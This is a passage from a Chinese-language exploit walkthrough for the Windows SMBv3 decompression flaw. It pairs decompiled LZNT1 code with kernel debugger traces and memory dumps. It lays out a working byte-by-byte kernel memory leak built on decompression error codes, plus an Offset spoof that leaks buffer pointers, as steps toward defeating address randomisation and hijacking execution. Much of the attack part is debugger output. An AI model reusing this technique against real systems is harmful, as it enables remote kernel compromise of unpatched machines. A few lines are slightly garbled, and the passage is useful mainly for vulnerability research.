      }
    LABEL_32:
      v10 = 0xC0000242;                             // 错误流程
      *v17 = (_DWORD)compressed_data_point;
    LABEL_15:
      if ( _InterlockedExchangeAdd((volatile signed __int32 *)&v23, 0xFFFFFFFF) == 1 )
        KeSetEvent(&Event, 0, 0);
      KeWaitForSingleObject(&Event, Executive, 0, 0, 0i64);
      if ( v10 >= 0 && v23 0且第二个XX的最高位为1。作者在进行数据泄露的时候使用的FF
FF满足此条件，关键代码如下，当标志字节为FF时，由于第一个标志位被设置，会跳出上面的循环，然后取出两个字节的0xFFFF。由于比较第一个比特位的时候就跳出循环，decompress_data_p1、decompress_data_p2
和 decompress_data_p3 都指向原始的目标缓冲区（本来也就是起点）。所以 v11 也是初始值
0xD，v14（v15）为标志位1相应的双字0xFFFF。由于decompress_data_p1 – 0xFFFF >> 0xD -1
肯定小于decompress_data_p2，会返回错误码 0xC0000242。
       if ( *compressed_data_p1 & 1 )
            break;
       *decompress_data_p1 = compressed_data_p1[1];
       ......
    }
    while ( decompress_data_p1 > decompress_data_p3 )
    {
       v11 = (unsigned int)(v11 - 1);
       decompress_data_p3 = (_BYTE *)(dword_14037B700[v11] + decompress_data_p2);
    }
    v13 = compressed_data_p1 + 1;
    v14 = *(_WORD *)(compressed_data_p1 + 1);
    v15 = v14;
    v17 = dword_14037B744[v11] & v14;
    v11 = (unsigned int)v11;
    v16 = v17;
    v18 = &decompress_data_p1[-(v15 >> v11) - 1];
    if ( (unsigned __int64)v18  
    nt!LZNT1DecompressChunk+0x66e:
    fffff802`52ddd93e 488d743eff      lea     rsi,[rsi+rdi-1]
    kd> p
    nt!LZNT1DecompressChunk+0x673:
    fffff802`52ddd943 493bf2          cmp     rsi,r10
    kd> 
    nt!LZNT1DecompressChunk+0x676:
    fffff802`52ddd946 0f82cd040000    jb      nt!LZNT1DecompressChunk+0xb49 (fffff802`52ddde19)
    kd> 
    nt!LZNT1DecompressChunk+0xb49:
    fffff802`52ddde19 b8420200c0      mov     eax,0C0000242h
**单字节泄露思路**
泄露的思路就是利用解压算法的上述特性，在想要泄露的字节后面加上b0（满足压缩标志）以及一定数量的 00 和
FF，00表示的数据为绝对有效数据。当处理完一个压缩块之后，会继续向后取两个字节，如果取到的是00 00，解压就会正常完成，如果是 00 FF 或者 FF
FF，解压就会失败。
    kd> db ffffa508`31ac1158
    ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
    ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
如下所示，a5是想要泄露的字节，先假设可以将测试数据放在后面。根据解压算法可知，首先会取出b0a5，然后和0xfff相与后加3，得到a8，从a5开始数a8个字节，这些数据都属于第一个压缩块。如果要求第二次取出来的双字还是00
00，就需要a8-2+2个字节的00，也就是a5+3。如果00的个数小于x+3，第二次取双字的时候就一定会命中后面的FF，触发错误。采用二分法找到满足条件的x，使得当00的数量为x+3时解压缩正常完成，并且当00的数量为x+2时解压失败，此时得到要泄露的那个字节数据x。
下面开始步入正题，一步一步获取关键模块基址，劫持系统执行流程。为了方便描述利用思路，在 Windows 1903
单核系统上进行调试，利用前还需要收集各漏洞版本以下函数在模块中的偏移，以便后续进行匹配，计算相应模块基址及函数地址：
**srvnet.sys** | **ntoskrnl.exe**  
---|---  
srvnet!SrvNetWskConnDispatch | nt!IoSizeofWorkItem  
srvnet!imp_IoSizeofWorkItem | nt!MiGetPteAddress  
srvnet!imp_RtlCopyUnicodeString  
###  泄露 User Buffer 指针
这一步要泄露的数据是已知大小缓冲区的User
Buffer指针（POC中是0x2100）。请求包结构如下，Offset为0x2116，Originalsize为0，由于Offset+Originalsize=0x2116，所以会分配大小为0x4100的User
Buffer来存放还原的数据。然而，原始请求包的User Buffer大小为0x2100（可容纳0x10大小的头和0x1101大小的Data），Offset
0x2116明显超出了该缓冲区的长度，在后续的memcpy操作中会存在越界读取。Offset欺骗也是1206的一部分，在取得Offset的值之后没有判断其大小是否超出的User
Buffer的界限，从而在解压成功后将这部分数据复制到一个可控的区域。又由于数据未初始化，可利用LZNT1解压将目标指针泄露出来。
以下为请求包的Srvnet Buffer Header信息，由于复制操作是从Raw
Data区域开始（跳过0x10头部），因而越界读取并复制的数据长度为0x2116+0x10-0x2100 = 0x26，这包括存放在Srvnet
Buffer Header偏移0x18处的User Buffer指针 0xffffa50836240050。
    kd> g
    request: ffffa508`36240050  424d53fc 00000000 00000001 00002116
    srv2!Srv2DecompressData+0x26:
    fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h
    kd> dd rax
    ffffa508`36242150  2f566798 ffffa508 2f566798 ffffa508
    ffffa508`36242160  00010002 00000000 36240050 ffffa508
    ffffa508`36242170  00002100 00001111 00002288 c0851000
    kd> dd ffffa508`36240050+10+2116-6-10 l8
    ffffa508`36242160  00010002 00000000 36240050 ffffa508
    ffffa508`36242170  00002100 00001111 00002288 c0851000
以下为分配的0x4100的缓冲区，其User Buffer首地址为0xffffa50835a92050：
    kd> g
    alloc: ffffa508`35a92050  cf8b48d6 006207e8 ae394c00 00000288
    srv2!Srv2DecompressData+0x85:
    fffff802`51ce7ee5 488bd8          mov     rbx,rax
    kd> dd rax
    ffffa508`35a96150  a1e83024 48fffaef 4810478b 30244c8d
    ffffa508`35a96160  00020002 00000000 35a92050 ffffa508
    ffffa508`35a96170  00004100 00000000 000042a8 245c8b48
由于解压成功，所以进入memcpy流程，0x2100缓冲区的User
Buffer指针0xffffa50836240050被复制到0x4100缓冲区偏移0x2108处:
    kd> dd ffffa508`35a92050 + 2100
    ffffa508`35a94150  840fc085 000000af 24848d48 000000a8
    ffffa508`35a94160  24448948 548d4120 b9410924 00000eda
    kd> p
    srv2!Srv2DecompressData+0x10d:
    fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
    kd> dd ffffa508`35a92050 + 2100
    ffffa508`35a94150  00010002 00000000 36240050 ffffa508
    ffffa508`35a94160  00002100 548d1111 b9410924 00000eda
然后下一步是覆盖 0x4100缓冲区中存放的0x2100缓冲区User Buffer Ptr 中 08 a5
后面的ffff等数据（由于地址都是以0xffff开头，所以这两个字节可以不用测）。为了不破坏前面的数据（不执行memcpy），要使得解压失败（在压缩的测试数据后面填充\xFF），但成功解压出测试数据。
以下为解压前后保存的User Buffer Ptr
的状态，可以发现解压后的数据正好满足之前所讲的单字节泄露模式，如果可欺骗程序使其解压0xffffa50835a9415d处的数据，就可以通过多次测试泄露出最高位0xa5：
    //待解压数据
    kd> dd ffffa508`31edb050+10+210e
    ffffa508`31edd16e  b014b007 ff007e00 ffff007c ffffffff
    ffffa508`31edd17e  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd18e  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd19e  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd1ae  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd1be  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd1ce  ffffffff ffffffff ffffffff ffffffff
    ffffa508`31edd1de  ffffffff ffffffff ffffffff ffffffff
    //解压前数据
    kd> db r9 - 6
    ffffa508`35a94158  50 00 24 36 08 a5 ff ff-00 21 00 00 11 11 8d 54  P.$6.....!.....T
    ffffa508`35a94168  24 09 41 b9 da 0e 00 00-45 8d 44 24 01 48 8b ce  $.A.....E.D$.H..
    ffffa508`35a94178  ff 15 c2 68 01 00 85 c0-78 27 8b 94 24 a8 00 00  ...h....x'..$...
    ffffa508`35a94188  00 0f b7 c2 c1 e8 08 8d-0c 80 8b c2 c1 e8 10 0f  ................
    ffffa508`35a94198  b6 c0 03 c8 0f b6 c2 8d-0c 41 41 3b cf 41 0f 96  .........AA;.A..
    ffffa508`35a941a8  c4 48 8d 44 24 30 48 89-44 24 20 ba 0e 00 00 00  .H.D$0H.D$ .....
    ffffa508`35a941b8  41 b9 db 0e 00 00 44 8d-42 f4 48 8b ce ff 15 75  A.....D.B.H....u
    ffffa508`35a941c8  68 01 00 85 c0 78 2f 8b-54 24 30 0f b7 c2 c1 e8  h....x/.T$0.....
    kd> p
    srv2!Srv2DecompressData+0xe1:
    fffff802`51ce7f41 85c0            test    eax,eax
    //解压后数据
    kd> db ffffa508`35a9415d lff
    ffffa508`35a9415d  a5 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a9416d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a9417d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a9418d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a9419d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a941ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a941bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a941cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`35a941dd  00 00 00 00 ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a941ed  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a941fd  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a9420d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a9421d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a9422d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................